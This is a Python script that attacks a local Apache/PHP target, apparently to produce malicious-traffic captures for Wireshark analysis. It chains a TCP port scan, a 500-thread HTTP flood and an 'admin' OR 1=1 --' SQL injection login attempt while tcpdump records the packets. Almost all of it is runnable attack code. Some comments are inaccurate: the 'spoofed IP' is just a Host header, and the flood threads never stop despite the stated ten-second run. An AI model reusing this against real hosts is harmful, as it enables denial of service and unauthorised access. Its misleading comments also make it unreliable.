import socket
import threading
import requests
import time
import os

# Target Apache server
TARGET_IP = "127.0.0.1"
TARGET_PORT = 80
FAKE_IP = "192.168.1.100"  # Spoofed IP for DDoS attack

# ---------------------- 1️⃣ PORT SCANNING (Nmap Alternative in Python) ----------------------
def port_scan():
    print("\n🚀 Starting Port Scanning Attack...")
    for port in range(1, 1001):  # Scanning ports 1-1000
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((TARGET_IP, port))  # Connect to port
        if result == 0:
            print(f"🔥 Port {port} is open!")
        s.close()
    print("✅ Port Scan Completed!\n")

# ---------------------- 2️⃣ DDoS ATTACK (HTTP Flood) ----------------------
def ddos_attack():
    print("\n🚀 Starting DDoS Attack...")
    
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((TARGET_IP, TARGET_PORT))
                s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (TARGET_IP, TARGET_PORT))
                s.sendto(("Host: " + FAKE_IP + "\r\n\r\n").encode("ascii"), (TARGET_IP, TARGET_PORT))
                s.close()
            except:
                pass

    # Launch multiple attack threads
    threads = []
    for _ in range(500):  # 500 attack threads
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    time.sleep(10)  # Run for 10 seconds
    print("✅ DDoS Attack Completed!\n")

# ---------------------- 3️⃣ SQL INJECTION ATTACK ----------------------
def sql_injection():
    print("\n🚀 Starting SQL Injection Attack...")

    url = "http://localhost:8080/login.php"  # Login page
    payload = {
        "user": "admin' OR 1=1 --",
        "password": "password"
    }

    try:
        response = requests.get(url, params=payload)
        print(f"Response Code: {response.status_code}")
        print(f"Response Body:\n{response.text[:500]}")  # Show first 500 chars
    except requests.exceptions.RequestException as e:
        print(f"❌ Request failed: {e}")

    print("✅ SQL Injection Attack Completed!\n")

# ---------------------- 4️⃣ PACKET CAPTURE (tcpdump in a Background Thread) ----------------------
def start_packet_capture():
    print("📡 Starting Packet Capture with tcpdump...")
    os.system('docker run --rm --net=host -v C:/Users/tx682/traffic-simulation:/pcap nicolaka/netshoot sh -c "touch /pcap/malicious_traffic.pcap && tcpdump -i eth0 -w /pcap/malicious_traffic.pcap"')

# ---------------------- EXECUTE ALL ATTACKS ----------------------
if __name__ == "__main__":
    print("\n🔥 RUNNING ALL ATTACKS 🔥\n")

    # Ensure the PCAP file exists before starting tcpdump
    pcap_path = "C:/Users/tx682/traffic-simulation/malicious_traffic.pcap"
    
    # Remove existing PCAP file (if any) and create a new empty file
    if os.path.exists(pcap_path):
        os.remove(pcap_path)
    open(pcap_path, 'w').close()

    # Start tcpdump in a background thread
    tcpdump_thread = threading.Thread(target=start_packet_capture, daemon=True)
    tcpdump_thread.start()

    # Run each attack one after another
    port_scan()
    ddos_attack()
    sql_injection()

    # Stop tcpdump after attacks are completed
    print("\n🛑 Stopping Packet Capture...")
    os.system('docker ps | findstr netshoot | for /F "tokens=1" %i in (\'docker ps -q --filter ancestor=nicolaka/netshoot\') do docker stop %i')

    print("\n✅ ALL ATTACKS COMPLETED! Check `malicious_traffic.pcap` in Wireshark.")
